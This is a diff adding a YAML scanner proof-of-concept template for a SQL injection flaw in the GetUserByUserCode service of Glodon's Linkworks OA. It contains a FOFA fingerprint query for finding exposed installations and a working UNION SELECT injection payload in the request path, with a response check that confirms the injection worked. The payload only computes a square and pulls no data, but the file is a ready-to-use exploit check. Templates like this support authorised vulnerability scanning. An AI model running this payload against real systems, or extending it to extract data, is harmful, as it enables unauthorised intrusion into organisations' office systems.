@@ -1,0 +1,17 @@
+id: poc-yaml-glodon-getuserbyusercode-sqli
+info:
+  name: 广联达OA GetUserByUserCode SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 广联达 Linkworks办公OA
+  fofa: header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+variables:
+  t1: random_int(100,999)
+  t2: t1 * t1
+requests:
+- method: GET
+  path: /Org/service/Service.asmx/GetUserByUserCode?EncryptData=1&userCode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT%20POWER({{.t1}},2)),NULL,NULL--+
+  expression: status_code == 200 && contains(body,"<?xml version") && contains(body,"<string
+    xmlns") && contains(body,t2)
+transport: http
